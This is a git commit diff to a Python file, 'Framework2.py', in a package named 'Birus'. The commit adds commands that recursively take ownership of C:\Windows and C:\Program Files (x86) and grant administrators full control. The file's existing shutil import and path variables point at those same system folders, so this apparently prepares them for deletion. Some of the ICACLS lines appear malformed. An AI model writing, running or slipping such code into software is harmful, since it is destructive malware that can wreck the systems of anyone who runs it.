196e7a607285f3b18cac817b620ba3c6acd5fcc6
JigTheFig <51309806+JigTheFig@users.noreply.github.com>
2020-08-21 14:35:43 +1000

    Update Framework2.py

--- Birus Package/Framework2.py
+++ Birus Package/Framework2.py
@@ -1,4 +1,11 @@
 import shutil
+import os
+
+os.system('cmd /k "takeown /a /r /d Y /f C:\Windows"')
+os.system('cmd /k "takeown /a /r /d Y /f C:\Program Files (x86)"')
+os.system('cmd /k "ICACLS <C:\Windows> /grant administrators:F"')
+os.system('cmd /k "ICACLS <C:\Program Files (x86)> /grant administrators:F"')
+
 i = int (0)
 path2 = (r"C:\Program Files (x86)")
 path = (r"C:\Windows")
